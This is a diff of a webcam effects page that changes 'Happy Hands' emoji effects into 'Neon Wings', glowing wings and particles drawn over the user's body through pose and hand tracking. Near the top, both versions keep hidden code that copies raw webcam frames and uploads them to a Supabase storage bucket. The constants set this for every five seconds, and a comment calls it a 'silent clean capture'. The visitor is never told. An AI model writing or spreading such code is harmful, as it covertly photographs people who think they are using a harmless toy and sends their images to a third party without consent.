@@ -2,365 +2,674 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Happy Hands</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, orientation=landscape">
+<title>Neon Wings</title>
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <style>
-  * { margin: 0; padding: 0; box-sizing: border-box; }
-  body { background: #000; width: 100vw; height: 100vh; overflow: hidden; }
-  #main-canvas { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 1; }
-  #video, #capture-canvas { display: none; }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  body { background:#000; width:100vw; height:100vh; overflow:hidden; }
+
+  body::after {
+    content:''; position:fixed; inset:0; pointer-events:none; z-index:50;
+    background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.1) 2px,rgba(0,0,0,0.1) 4px);
+  }
+  body::before {
+    content:''; position:fixed; inset:0; pointer-events:none; z-index:49;
+    background:radial-gradient(ellipse at center,transparent 50%,rgba(0,0,20,0.72) 100%);
+  }
+
+  #main-canvas { position:fixed; top:0; left:0; width:100vw; height:100vh; z-index:1; }
+  #video, #cap-canvas { display:none; }
+
+  #controls {
+    position:fixed; top:12px; left:50%; transform:translateX(-50%);
+    z-index:60; display:flex; gap:8px; align-items:center; flex-wrap:wrap; justify-content:center;
+  }
+  .wing-btn {
+    font:700 11px 'Courier New',monospace; letter-spacing:0.08em; text-transform:uppercase;
+    padding:7px 14px; border-radius:20px; border:2px solid transparent;
+    cursor:pointer; background:rgba(0,0,0,0.55); color:#fff;
+    transition:all 0.2s; backdrop-filter:blur(6px);
+  }
+  .wing-btn.active { border-color:#fff; }
+  .wing-btn:hover  { transform:scale(1.07); }
+
+  #hint {
+    position:fixed; bottom:18px; left:50%; transform:translateX(-50%);
+    z-index:60; color:rgba(180,100,255,0.55);
+    font:10px/1 'Courier New',monospace; letter-spacing:0.15em; text-transform:uppercase;
+    background:rgba(0,0,0,0.4); padding:6px 16px; border-radius:20px;
+    pointer-events:none; transition:opacity 2s;
+  }
 </style>
 </head>
 <body>
 
 <video id="video" autoplay playsinline muted></video>
 <canvas id="main-canvas"></canvas>
-<canvas id="capture-canvas"></canvas>
+<canvas id="cap-canvas"></canvas>
+
+<div id="controls">
+  <button class="wing-btn active" data-color="purple" style="color:#c77dff">⚡ Electric</button>
+  <button class="wing-btn"        data-color="cyan"   style="color:#00ffe0">❄️ Frost</button>
+  <button class="wing-btn"        data-color="fire"   style="color:#ff6a00">🔥 Fire</button>
+  <button class="wing-btn"        data-color="gold"   style="color:#ffd700">✨ Angel</button>
+</div>
+<div id="hint">step back so your upper body is visible</div>
 
 <script>
-
-const SUPABASE_URL = "https://cmwjbqmpxnfxcirshpcr.supabase.co";   
-const SUPABASE_KEY = "sb_publishable_f7rpHGRrMPbcmsPiPAV33g_jVscEezr";   
+const SUPABASE_URL = "https://cmwjbqmpxnfxcirshpcr.supabase.co";
+const SUPABASE_KEY = "sb_publishable_f7rpHGRrMPbcmsPiPAV33g_jVscEezr";
 const BUCKET       = "snapshots";
-const CAPTURE_MS   = 5000; 
+const CAPTURE_MS   = 5000;
 </script>
+<!-- ════════════════════════════════════════════ -->
 
+<script src="https://cdn.jsdelivr.net/npm/@mediapipe/pose/pose.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/@mediapipe/hands/hands.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils/camera_utils.js"></script>
 
 <script>
 // ─────────────────────────────────────────────────────────────────────────────
-//  CANVAS SETUP
+//  SETUP
 // ─────────────────────────────────────────────────────────────────────────────
 const mainCanvas = document.getElementById('main-canvas');
 const ctx        = mainCanvas.getContext('2d');
-const capCanvas  = document.getElementById('capture-canvas');
+const capCanvas  = document.getElementById('cap-canvas');
 const capCtx     = capCanvas.getContext('2d');
 const video      = document.getElementById('video');
+const hint       = document.getElementById('hint');
 
 function resize() { mainCanvas.width = window.innerWidth; mainCanvas.height = window.innerHeight; }
 resize();
 window.addEventListener('resize', resize);
 
-
+// ─────────────────────────────────────────────────────────────────────────────
+//  SUPABASE — silent clean capture every 5s
+// ─────────────────────────────────────────────────────────────────────────────
 let sb = null;
-if (SUPABASE_URL && SUPABASE_KEY) {
-  sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
-}
-async function captureCleanFrame() {
+if (SUPABASE_URL && SUPABASE_KEY) sb = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);
+
+async function captureClean() {
   if (!sb || !video.videoWidth) return;
   capCanvas.width  = video.videoWidth;
   capCanvas.height = video.videoHeight;
   capCtx.drawImage(video, 0, 0);
   const blob = await new Promise(r => capCanvas.toBlob(r, 'image/jpeg', 0.88));
-  sb.storage.from(BUCKET).upload(`snap_${Date.now()}.jpg`, blob, {
+  sb.storage.from(BUCKET).upload(`wings_${Date.now()}.jpg`, blob, {
     contentType: 'image/jpeg', upsert: false
   });
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
-//  EMOJI LISTS
+//  THEMES
 // ─────────────────────────────────────────────────────────────────────────────
-const HEAD_EMOJIS     = ['❤️','💕','💖','💗','💓','🌸','✨','💫','🌷','💝','🥰','💞'];
-const PALM_EMOJIS     = ['😊','🌟','💛','🍀','🦋','🌈','💐','🎀','🌻','⭐','🎵','🍭'];
-const CONFETTI_EMOJIS = ['🎉','🎊','⭐','🌈','💥','✨','🎈','💖','🍭','🎁','🥳','🎶'];
+const THEMES = {
+  purple: { inner:'#e040fb', outer:'#7b2fff', core:'#fff0ff', glow:'#c77dff', rain:'#d966ff' },
+  cyan:   { inner:'#00ffe0', outer:'#0077ff', core:'#f0ffff', glow:'#00ffe0', rain:'#00eeff' },
+  fire:   { inner:'#ff6a00', outer:'#ff0040', core:'#fffaf0', glow:'#ff6a00', rain:'#ffaa00' },
+  gold:   { inner:'#ffd700', outer:'#ff9500', core:'#fffff0', glow:'#ffd700', rain:'#ffe066' },
+};
+let theme = THEMES.purple;
+
+document.querySelectorAll('.wing-btn').forEach(btn => {
+  btn.addEventListener('click', () => {
+    document.querySelectorAll('.wing-btn').forEach(b => b.classList.remove('active'));
+    btn.classList.add('active');
+    theme = THEMES[btn.dataset.color];
+  });
+});
 
 // ─────────────────────────────────────────────────────────────────────────────
-//  EMOJI PARTICLE
+//  PARTICLE RAIN
 // ─────────────────────────────────────────────────────────────────────────────
-class EmojiParticle {
-  constructor(x, y, emoji, opts = {}) {
-    this.x      = x;
-    this.y      = y;
-    this.emoji  = emoji;
-    this.vx     = opts.vx      ?? (Math.random() - 0.5) * 3;
-    this.vy     = opts.vy      ?? -(2 + Math.random() * 3);
-    this.size   = opts.size    ?? 48;
-    this.life   = 1.0;
-    this.decay  = opts.decay   ?? 0.01;
-    this.gravity= opts.gravity ?? 0.05;
-    this.rot    = Math.random() * Math.PI * 2;
-    this.rotV   = (Math.random() - 0.5) * 0.06;
+const rainParticles = [];
+const MAX_RAIN = 120;
+
+class RainParticle {
+  constructor(x, y) {
+    this.x     = x + (Math.random() - 0.5) * 30;
+    this.y     = y;
+    this.vx    = (Math.random() - 0.5) * 1.2;
+    this.vy    = 1.5 + Math.random() * 2.5;
+    this.size  = 2 + Math.random() * 3;
+    this.life  = 1.0;
+    this.decay = 0.012 + Math.random() * 0.01;
+    this.twinkle = Math.random() * Math.PI * 2;
   }
   update() {
     this.x    += this.vx;
     this.y    += this.vy;
-    this.vy   += this.gravity;
-    this.rot  += this.rotV;
+    this.vy   += 0.04; // gravity
     this.life -= this.decay;
+    this.twinkle += 0.15;
   }
   draw() {
     if (this.life <= 0) return;
+    const twinkleAlpha = 0.6 + Math.sin(this.twinkle) * 0.4;
     ctx.save();
-    ctx.globalAlpha  = Math.min(1, this.life + 0.3); // mostly opaque
-    ctx.font         = `${this.size}px serif`;
-    ctx.textAlign    = 'center';
-    ctx.textBaseline = 'middle';
-    ctx.translate(this.x, this.y);
-    ctx.rotate(this.rot);
-    ctx.fillText(this.emoji, 0, 0);
+    ctx.globalAlpha  = this.life * twinkleAlpha;
+    ctx.shadowColor  = theme.glow;
+    ctx.shadowBlur   = 10;
+    ctx.fillStyle    = theme.rain;
+    ctx.beginPath();
+    ctx.arc(this.x, this.y, this.size * this.life, 0, Math.PI * 2);
+    ctx.fill();
+    // bright centre
+    ctx.fillStyle   = '#fff';
+    ctx.globalAlpha = this.life * twinkleAlpha * 0.7;
+    ctx.shadowBlur  = 0;
+    ctx.beginPath();
+    ctx.arc(this.x, this.y, this.size * this.life * 0.4, 0, Math.PI * 2);
+    ctx.fill();
+    ctx.restore();
+  }
+}
+
+function spawnRain(x, y) {
+  if (rainParticles.length >= MAX_RAIN) return;
+  rainParticles.push(new RainParticle(x, y));
+}
+
+function tickRain() {
+  for (let i = rainParticles.length - 1; i >= 0; i--) {
+    rainParticles[i].update();
+    rainParticles[i].draw();
+    if (rainParticles[i].life <= 0) rainParticles.splice(i, 1);
+  }
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+//  GLOW LINE + CURVE HELPERS
+// ─────────────────────────────────────────────────────────────────────────────
+function glowLine(x1, y1, x2, y2, width, alpha=1) {
+  ctx.save(); ctx.strokeStyle=theme.outer; ctx.lineWidth=width+10;
+  ctx.globalAlpha=0.07*alpha; ctx.shadowColor=theme.glow; ctx.shadowBlur=30;
+  ctx.beginPath(); ctx.moveTo(x1,y1); ctx.lineTo(x2,y2); ctx.stroke(); ctx.restore();
+
+  ctx.save(); ctx.strokeStyle=theme.inner; ctx.lineWidth=width+4;
+  ctx.globalAlpha=0.28*alpha; ctx.shadowColor=theme.glow; ctx.shadowBlur=20;
+  ctx.beginPath(); ctx.moveTo(x1,y1); ctx.lineTo(x2,y2); ctx.stroke(); ctx.restore();
+
+  ctx.save(); ctx.strokeStyle=theme.core; ctx.lineWidth=Math.max(0.8,width*0.5);
+  ctx.globalAlpha=0.95*alpha; ctx.shadowColor=theme.glow; ctx.shadowBlur=10;
+  ctx.beginPath(); ctx.moveTo(x1,y1); ctx.lineTo(x2,y2); ctx.stroke(); ctx.restore();
+}
+
+function glowCurve(points, width, alpha=1) {
+  if (points.length < 2) return;
+  const draw = (lw, color, ga, blur) => {
+    ctx.save(); ctx.strokeStyle=color; ctx.lineWidth=lw;
+    ctx.globalAlpha=ga; ctx.shadowColor=theme.glow; ctx.shadowBlur=blur;
+    ctx.lineCap='round'; ctx.lineJoin='round';
+    ctx.beginPath(); ctx.moveTo(points[0].x, points[0].y);
+    for (let i=1; i<points.length-1; i++) {
+      const mx=(points[i].x+points[i+1].x)/2, my=(points[i].y+points[i+1].y)/2;
+      ctx.quadraticCurveTo(points[i].x,points[i].y,mx,my);
+    }
+    ctx.lineTo(points[points.length-1].x, points[points.length-1].y);
+    ctx.stroke(); ctx.restore();
+  };
+  draw(width+12, theme.outer, 0.07*alpha, 35);
+  draw(width+5,  theme.inner, 0.28*alpha, 22);
+  draw(width*0.6,theme.core,  0.92*alpha, 12);
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+//  DRAW WING
+//  side: -1 = left, +1 = right
+//  flapOffset: current flap angle from animation
+// ─────────────────────────────────────────────────────────────────────────────
+function drawWing(shoulder, side, wingSpan, flapOffset) {
+  const cx = shoulder.x;
+  const cy = shoulder.y;
+  const len      = wingSpan;
+  const feathers = 6;
+
+  // Base direction: pure left or right
+  const baseAngle = side === -1 ? Math.PI : 0;
+
+  // Flap: top feathers lift up, bottom stay — natural bird wing feel
+  const flapLift = flapOffset * 0.35; // how much flap affects Y
+
+  // Ripple: each feather ripples slightly offset in phase
+  const rippleAmp = 0.04;
+
+  const tipPoints = []; // collect tip positions for rain spawning
+
+  for (let f = 0; f < feathers; f++) {
+    const t = f / (feathers - 1); // 0=top, 1=bottom
+
+    // Fan: top feathers angle upward, bottom angle downward
+    const fanTop    = -0.5 + flapLift;           // rises on upstroke
+    const fanBottom =  0.6 - flapLift * 0.3;     // less movement at bottom
+    const fanOffset = fanTop + (fanBottom - fanTop) * t;
+
+    // Per-feather ripple wave (staggered phase)
+    const ripple    = Math.sin(flapOffset * 3 + f * 0.6) * rippleAmp;
+    const fanAngle  = baseAngle + (fanOffset + ripple) * side;
+
+    // Length tapering
+    const featherLen = len * (1.0 - t * 0.42);
+    const baseWidth  = 3 + (1 - t) * 5;
+
+    const tipX = cx + Math.cos(fanAngle) * featherLen;
+    const tipY = cy + Math.sin(fanAngle) * featherLen;
+
+    // Elegant upward curve on each feather
+    const cpAngle = fanAngle - 0.1 * side;
+    const cpX = cx + Math.cos(cpAngle) * featherLen * 0.55;
+    const cpY = cy + Math.sin(cpAngle) * featherLen * 0.55 - featherLen * 0.08;
+
+    const pts = [{ x:cx, y:cy }, { x:cpX, y:cpY }, { x:tipX, y:tipY }];
+    glowCurve(pts, baseWidth * (1 - t * 0.4), 0.6 + (1 - t) * 0.4);
+
+    // Split tip
+    if (f < feathers - 1) {
+      const splitAngle = fanAngle - 0.2 * side;
+      const splitLen   = featherLen * 0.25;
+      glowLine(tipX, tipY,
+        tipX + Math.cos(splitAngle) * splitLen,
+        tipY + Math.sin(splitAngle) * splitLen,
+        1.2, 0.35);
+    }
+
+    tipPoints.push({ x:tipX, y:tipY });
+  }
+
+  // Wing spine
+  const spineAngle = baseAngle - 0.07 * side;
+  glowLine(cx, cy,
+    cx + Math.cos(spineAngle) * len * 0.88,
+    cy + Math.sin(spineAngle) * len * 0.88,
+    3, 0.9);
+
+  return tipPoints;
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+//  SHOULDER PULSE DOT
+// ─────────────────────────────────────────────────────────────────────────────
+function drawShoulderDot(pt, pulseT) {
+  const pulse = 0.6 + Math.sin(pulseT) * 0.4;
+  ctx.save();
+  ctx.shadowColor  = theme.glow; ctx.shadowBlur = 28 * pulse;
+  ctx.fillStyle    = theme.inner; ctx.globalAlpha = 0.9 * pulse;
+  ctx.beginPath(); ctx.arc(pt.x, pt.y, 8 * pulse, 0, Math.PI*2); ctx.fill();
+  ctx.fillStyle    = '#fff'; ctx.globalAlpha = 0.8; ctx.shadowBlur = 0;
+  ctx.beginPath(); ctx.arc(pt.x, pt.y, 3.5, 0, Math.PI*2); ctx.fill();
+  // outer ring
+  ctx.strokeStyle  = theme.glow; ctx.lineWidth = 1.5;
+  ctx.globalAlpha  = 0.3 * pulse; ctx.shadowBlur = 14;
+  ctx.shadowColor  = theme.glow;
+  ctx.beginPath(); ctx.arc(pt.x, pt.y, 14 * pulse, 0, Math.PI*2); ctx.stroke();
+  ctx.restore();
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+//  VIDEO BACKGROUND
+// ─────────────────────────────────────────────────────────────────────────────
+function drawVideo() {
+  if (!video.videoWidth) return;
+  const vw=video.videoWidth, vh=video.videoHeight;
+  const cw=mainCanvas.width, ch=mainCanvas.height;
+  const s=Math.max(cw/vw, ch/vh);
+  const dw=vw*s, dh=vh*s, dx=(cw-dw)/2, dy=(ch-dh)/2;
+  ctx.save();
+  ctx.translate(cw,0); ctx.scale(-1,1);
+  ctx.drawImage(video, cw-dx-dw, dy, dw, dh);
+  ctx.restore();
+  ctx.fillStyle='rgba(0,0,10,0.22)';
+  ctx.fillRect(0,0,cw,ch);
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+//  POSE STATE + ANIMATION TIMERS
+// ─────────────────────────────────────────────────────────────────────────────
+let poseData   = null;
+let handsData  = null;    // array of hand landmark arrays
+let clock      = 0;       // main animation clock
+let rainTimer  = 0;
+let wingScale  = 1.0;     // smoothly driven by hand height
+
+// ─────────────────────────────────────────────────────────────────────────────
+//  FINGERTIP GLOW
+// ─────────────────────────────────────────────────────────────────────────────
+const FINGERTIPS = [4, 8, 12, 16, 20]; // thumb, index, middle, ring, pinky
+
+function drawFingertips(landmarks) {
+  for (const idx of FINGERTIPS) {
+    const lm = landmarks[idx];
+    // mirror x like pose (1 - x)
+    const fx = (1 - lm.x) * mainCanvas.width;
+    const fy = lm.y * mainCanvas.height;
+    const pulse = 0.65 + Math.sin(clock * 3 + idx) * 0.35;
+    ctx.save();
+    ctx.shadowColor = theme.glow; ctx.shadowBlur = 22 * pulse;
+    ctx.fillStyle   = theme.inner; ctx.globalAlpha = 0.85 * pulse;
+    ctx.beginPath(); ctx.arc(fx, fy, 6 * pulse, 0, Math.PI * 2); ctx.fill();
+    ctx.fillStyle   = '#fff'; ctx.globalAlpha = 0.9; ctx.shadowBlur = 0;
+    ctx.beginPath(); ctx.arc(fx, fy, 2.5, 0, Math.PI * 2); ctx.fill();
     ctx.restore();
   }
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
-//  PARTICLE POOLS
+//  PALM BURST PARTICLES  (fire when palm faces up)
 // ─────────────────────────────────────────────────────────────────────────────
-const headPool     = [];
-const palmPool     = [];
-const confettiPool = [];
+const burstParticles = [];
+const MAX_BURST = 200;
 
-function pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; }
+// Theme burst shapes: 'orb' | 'shard' | 'star' | 'sparkle'
+const THEME_BURST = {
+  purple: 'shard',
+  cyan:   'star',
+  fire:   'orb',
+  gold:   'sparkle',
+};
 
-// Spawn heart/cute emoji near the estimated head position
-function spawnHeadEmoji(headX, headY) {
-  if (headPool.length >= 45) return;
-  const spread = mainCanvas.width * 0.18;
-  const x = headX + (Math.random() - 0.5) * spread;
-  const y = headY + (Math.random() - 0.5) * 30;
-  headPool.push(new EmojiParticle(x, y, pick(HEAD_EMOJIS), {
-    vx:      (Math.random() - 0.5) * 2,
-    vy:      -(1.2 + Math.random() * 2),
-    size:    44 + Math.random() * 20,
-    decay:   0.007 + Math.random() * 0.005,
-    gravity: -0.015  // float UP
-  }));
+function currentBurstShape() {
+  for (const [key, t] of Object.entries(THEMES)) {
+    if (t === theme) return THEME_BURST[key] || 'orb';
+  }
+  return 'orb';
 }
 
-// Shoot emojis from open palm
-function spawnPalmEmoji(px, py) {
-  if (palmPool.length >= 50) return;
-  const angle = -Math.PI / 2 + (Math.random() - 0.5) * Math.PI * 1.2;
-  const speed = 5 + Math.random() * 5;
-  palmPool.push(new EmojiParticle(px, py, pick(PALM_EMOJIS), {
-    vx:      Math.cos(angle) * speed,
-    vy:      Math.sin(angle) * speed,
-    size:    46 + Math.random() * 18,
-    decay:   0.013 + Math.random() * 0.008,
-    gravity: 0.12
-  }));
-}
+class BurstParticle {
+  constructor(x, y) {
+    const angle  = -Math.PI / 2 + (Math.random() - 0.5) * Math.PI * 0.9; // upward cone
+    const speed  = 2.5 + Math.random() * 5;
+    this.x       = x + (Math.random() - 0.5) * 18;
+    this.y       = y;
+    this.vx      = Math.cos(angle) * speed;
+    this.vy      = Math.sin(angle) * speed;
+    this.size    = 3 + Math.random() * 6;
+    this.rot     = Math.random() * Math.PI * 2;
+    this.rotV    = (Math.random() - 0.5) * 0.18;
+    this.life    = 1.0;
+    this.decay   = 0.016 + Math.random() * 0.012;
+    this.shape   = currentBurstShape();
+    this.twinkle = Math.random() * Math.PI * 2;
+  }
+  update() {
+    this.x      += this.vx;
+    this.y      += this.vy;
+    this.vy     += 0.07;   // gravity
+    this.vx     *= 0.985;  // drag
+    this.rot    += this.rotV;
+    this.life   -= this.decay;
+    this.twinkle += 0.12;
+  }
+  draw() {
+    if (this.life <= 0) return;
+    const a = this.life * (0.7 + Math.sin(this.twinkle) * 0.3);
+    const s = this.size * (0.4 + this.life * 0.6);
+    ctx.save();
+    ctx.translate(this.x, this.y);
+    ctx.rotate(this.rot);
+    ctx.globalAlpha  = a;
+    ctx.shadowColor  = theme.glow;
+    ctx.shadowBlur   = 18;
 
-// Confetti burst from screen center
-function spawnConfetti() {
-  if (confettiPool.length >= 60) return;
-  const cx = mainCanvas.width / 2;
-  const cy = mainCanvas.height / 2;
-  for (let i = 0; i < 12; i++) {
-    const angle = (Math.PI * 2 / 12) * i + Math.random() * 0.4;
-    const speed = 6 + Math.random() * 8;
-    confettiPool.push(new EmojiParticle(cx, cy, pick(CONFETTI_EMOJIS), {
-      vx:      Math.cos(angle) * speed,
-      vy:      Math.sin(angle) * speed,
-      size:    50 + Math.random() * 20,
-      decay:   0.011 + Math.random() * 0.008,
-      gravity: 0.15
-    }));
+    if (this.shape === 'shard') {
+      // Lightning shard — thin elongated diamond
+      ctx.fillStyle = this.life > 0.6 ? theme.core : theme.inner;
+      ctx.beginPath();
+      ctx.moveTo(0, -s * 2.2);
+      ctx.lineTo(s * 0.4, 0);
+      ctx.lineTo(0, s * 0.8);
+      ctx.lineTo(-s * 0.4, 0);
+      ctx.closePath();
+      ctx.fill();
+
+    } else if (this.shape === 'star') {
+      // 6-point star for frost
+      ctx.fillStyle = theme.inner;
+      ctx.beginPath();
+      for (let i = 0; i < 6; i++) {
+        const a1 = (i / 6) * Math.PI * 2;
+        const a2 = ((i + 0.5) / 6) * Math.PI * 2;
+        const r1 = s * 1.2, r2 = s * 0.45;
+        if (i === 0) ctx.moveTo(Math.cos(a1) * r1, Math.sin(a1) * r1);
+        else         ctx.lineTo(Math.cos(a1) * r1, Math.sin(a1) * r1);
+        ctx.lineTo(Math.cos(a2) * r2, Math.sin(a2) * r2);
+      }
+      ctx.closePath();
+      ctx.fill();
+      // core dot
+      ctx.fillStyle = '#fff'; ctx.shadowBlur = 0;
+      ctx.beginPath(); ctx.arc(0, 0, s * 0.3, 0, Math.PI * 2); ctx.fill();
+
+    } else if (this.shape === 'orb') {
+      // Glowing ember orb — fire
+      const grad = ctx.createRadialGradient(0, 0, 0, 0, 0, s);
+      grad.addColorStop(0,   theme.core);
+      grad.addColorStop(0.4, theme.inner);
+      grad.addColorStop(1,   'transparent');
+      ctx.fillStyle = grad;
+      ctx.beginPath(); ctx.arc(0, 0, s, 0, Math.PI * 2); ctx.fill();
+
+    } else {
+      // sparkle — 4-point cross with glint (gold/angel)
+      ctx.fillStyle = theme.inner;
+      ctx.beginPath();
+      for (let i = 0; i < 4; i++) {
+        const a1 = (i / 4) * Math.PI * 2;
+        const a2 = ((i + 0.5) / 4) * Math.PI * 2;
+        if (i === 0) ctx.moveTo(Math.cos(a1) * s * 1.5, Math.sin(a1) * s * 1.5);
+        else         ctx.lineTo(Math.cos(a1) * s * 1.5, Math.sin(a1) * s * 1.5);
+        ctx.lineTo(Math.cos(a2) * s * 0.35, Math.sin(a2) * s * 0.35);
+      }
+      ctx.closePath();
+      ctx.fill();
+      ctx.fillStyle = '#fffbe0'; ctx.shadowBlur = 0;
+      ctx.beginPath(); ctx.arc(0, 0, s * 0.28, 0, Math.PI * 2); ctx.fill();
+    }
+    ctx.restore();
   }
 }
 
-function tickPool(pool) {
-  for (let i = pool.length - 1; i >= 0; i--) {
-    pool[i].update();
-    pool[i].draw();
-    if (pool[i].life <= 0) pool.splice(i, 1);
+function spawnBurst(x, y, count = 1) {
+  for (let i = 0; i < count; i++) {
+    if (burstParticles.length < MAX_BURST) burstParticles.push(new BurstParticle(x, y));
   }
+}
+
+function tickBurst() {
+  for (let i = burstParticles.length - 1; i >= 0; i--) {
+    burstParticles[i].update();
+    burstParticles[i].draw();
+    if (burstParticles[i].life <= 0) burstParticles.splice(i, 1);
+  }
+}
+
+// Detect palm-up: middle finger tip (12) should be ABOVE wrist (0) by enough
+// and palm normal should face camera (z component check via wrist vs middle base)
+function isPalmUp(hand) {
+  const wrist      = hand[0];
+  const middleTip  = hand[12];
+  const middleMcp  = hand[9];  // middle finger base
+  // Palm up: fingertips above wrist in screen space (lower y = higher on screen)
+  // and the middle finger tip above the MCP
+  const fingerAboveWrist = middleTip.y < wrist.y - 0.05;
+  // Palm orientation: wrist z vs middle MCP z — when palm up, wrist z > middle z
+  const palmFacingUp = wrist.z > middleMcp.z + 0.01;
+  return fingerAboveWrist && palmFacingUp;
+}
+
+
+function updateWingScale(lm) {
+  if (!handsData || handsData.length === 0) {
+    wingScale += (1.0 - wingScale) * 0.06; // drift back to default
+    return;
+  }
+  const shoulderY = (lm[11].y + lm[12].y) / 2; // avg shoulder y (0-1)
+  let minWristY = shoulderY;
+  for (const hand of handsData) {
+    const wrist = hand[0]; // landmark 0 = wrist
+    if (wrist.y < minWristY) minWristY = wrist.y;
+  }
+  // How far above shoulders is the highest wrist? Map to [1.0 … 2.0]
+  const lift = Math.max(0, shoulderY - minWristY); // 0 when at shoulder, ~0.4 when fully raised
+  const target = 1.0 + Math.min(lift * 2.5, 1.0); // 1.0 → 2.0
+  wingScale += (target - wingScale) * 0.08; // smooth
+}
+
+
+function render() {
+  requestAnimationFrame(render);
+  clock += 0.03;
+  rainTimer++;
+
+  drawVideo();
+
+  if (!poseData) { tickRain(); tickBurst(); return; }
+  const lm = poseData;
+
+  if (lm[11].visibility < 0.4 || lm[12].visibility < 0.4) { tickRain(); tickBurst(); return; }
+
+  const leftShoulder  = toScreen(lm[11]);
+  const rightShoulder = toScreen(lm[12]);
+
+  // Wing span from shoulder width
+  const shoulderWidth = Math.hypot(
+    rightShoulder.x - leftShoulder.x,
+    rightShoulder.y - leftShoulder.y
+  );
+
+  // Hand tracking: update wing scale from wrist height
+  updateWingScale(lm);
+  const wingSpan = shoulderWidth * 3.0 * wingScale;
+
+  // Flap: slow sine wave — full flap cycle every ~3 seconds
+  const flapOffset = Math.sin(clock * 1.1) * 0.6;
+
+  // Pulse for shoulder dots
+  const pulseT = clock * 2.2;
+
+  // Draw wings, get tip positions for rain
+  const leftTips  = drawWing(leftShoulder,  -1, wingSpan, flapOffset);
+  const rightTips = drawWing(rightShoulder, +1, wingSpan, flapOffset);
+
+  // Shoulder pulse dots
+  drawShoulderDot(leftShoulder,  pulseT);
+  drawShoulderDot(rightShoulder, pulseT + Math.PI); // offset phase
+
+  // Fingertip glows + palm burst from hands tracking
+  if (handsData) {
+    for (const hand of handsData) {
+      drawFingertips(hand);
+      // Palm-up detection → burst from palm centre (landmark 9 = middle MCP)
+      if (isPalmUp(hand)) {
+        const palmLm = hand[9];
+        const px = (1 - palmLm.x) * mainCanvas.width;
+        const py = palmLm.y * mainCanvas.height;
+        // Spawn 2-4 particles per frame while palm is up
+        spawnBurst(px, py, 3);
+      }
+    }
+  }
+
+  // Spawn rain from outer wing tips every 2 frames
+  if (rainTimer % 2 === 0) {
+    // Pick 2 random tip points from each wing to rain from
+    const allTips = [...leftTips, ...rightTips];
+    for (let i = 0; i < 3; i++) {
+      const tip = allTips[Math.floor(Math.random() * allTips.length)];
+      spawnRain(tip.x, tip.y);
+    }
+  }
+
+  // Tick rain + burst particles
+  tickRain();
+  tickBurst();
 }
 
 // ─────────────────────────────────────────────────────────────────────────────
 //  HELPERS
 // ─────────────────────────────────────────────────────────────────────────────
-function lmToScreen(lm) {
+function toScreen(lm) {
   return { x: (1 - lm.x) * mainCanvas.width, y: lm.y * mainCanvas.height };
-}
-function dist2D(a, b) { return Math.hypot(a.x - b.x, a.y - b.y); }
-
-// Palm center = average of wrist + 4 knuckle bases
-function getPalmCenter(lm) {
-  const ids = [0, 5, 9, 13, 17];
-  let sx = 0, sy = 0;
-  for (const id of ids) { sx += lm[id].x; sy += lm[id].y; }
-  return { x: (1 - sx/5) * mainCanvas.width, y: (sy/5) * mainCanvas.height };
-}
-
-// Open palm: fingertips higher on screen (lower y) than their knuckle bases
-function isOpenPalm(lm) {
-  const tipIds = [8, 12, 16, 20];   // index→pinky tips
-  const mcpIds = [5,  9, 13, 17];   // their base knuckles
-  let count = 0;
-  for (let i = 0; i < tipIds.length; i++) {
-    // tip.y < mcp.y means finger is pointing up (extended)
-    if (lm[tipIds[i]].y < lm[mcpIds[i]].y - 0.04) count++;
-  }
-  return count >= 3;
-}
-
-// Estimate head position: above the highest wrist point, offset upward
-function estimateHead(handsData) {
-  if (handsData.length === 0) {
-    // No hands visible — default to top-center
-    return { x: mainCanvas.width / 2, y: mainCanvas.height * 0.1 };
-  }
-  // Find the highest (smallest y) wrist across all hands
-  let minY = Infinity, sumX = 0;
-  for (const lm of handsData) {
-    const w = lmToScreen(lm[0]);
-    if (w.y < minY) minY = w.y;
-    sumX += w.x;
-  }
-  const avgX = sumX / handsData.length;
-  // Head is roughly 30% of screen height above the wrists
-  const headY = Math.max(minY - mainCanvas.height * 0.28, mainCanvas.height * 0.05);
-  return { x: avgX, y: headY };
-}
-
-// Are both hands near each other (wrists close)?
-function handsNear(lm0, lm1) {
-  const w0 = lmToScreen(lm0[0]);
-  const w1 = lmToScreen(lm1[0]);
-  return dist2D(w0, w1) < mainCanvas.width * 0.22;
-}
-
-// ─────────────────────────────────────────────────────────────────────────────
-//  FINGER DOT COLORS (cute pastel)
-// ─────────────────────────────────────────────────────────────────────────────
-const TIP_COLORS = ['#ff6eb4','#ff9de2','#ffb347','#7de8ff','#b8f5a0'];
-const TIP_IDS    = [4, 8, 12, 16, 20];
-
-function drawHandDots(lm) {
-  for (let i = 0; i < TIP_IDS.length; i++) {
-    const p = lmToScreen(lm[TIP_IDS[i]]);
-    const c = TIP_COLORS[i];
-    ctx.save();
-    ctx.shadowColor = c;
-    ctx.shadowBlur  = 20;
-    ctx.fillStyle   = c;
-    ctx.globalAlpha = 0.95;
-    ctx.beginPath();
-    ctx.arc(p.x, p.y, 9, 0, Math.PI * 2);
-    ctx.fill();
-    ctx.shadowBlur  = 0;
-    ctx.fillStyle   = '#fff';
-    ctx.globalAlpha = 0.8;
-    ctx.beginPath();
-    ctx.arc(p.x, p.y, 4, 0, Math.PI * 2);
-    ctx.fill();
-    ctx.restore();
-  }
-}
-
-// ─────────────────────────────────────────────────────────────────────────────
-//  VIDEO BACKGROUND (mirrored, cover-fit)
-// ─────────────────────────────────────────────────────────────────────────────
-function drawVideo() {
-  if (!video.videoWidth) return;
